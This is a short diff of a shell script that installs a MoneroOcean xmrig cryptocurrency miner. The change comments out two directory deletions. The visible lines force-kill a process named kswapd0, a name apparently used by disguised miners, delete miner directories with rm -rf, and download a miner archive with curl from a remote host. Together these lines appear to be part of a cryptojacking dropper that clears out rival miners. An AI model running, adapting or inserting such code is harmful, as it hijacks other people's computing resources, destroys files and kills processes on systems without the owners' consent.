@@ -191,8 +191,8 @@ killall -9 kswapd0
 echo "[*] Removing previous directories..."
 rm -rf $HOME/moneroocean
 rm -rf $HOME/.moneroocean
-rm -rf $HOME/.gdm2
-rm -rf $HOME/.swapd
+#rm -rf $HOME/.gdm2
+#rm -rf $HOME/.swapd
 
 echo "[*] Downloading MoneroOcean advanced version of xmrig to xmrig.tar.gz"
 if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o xmrig.tar.gz; then
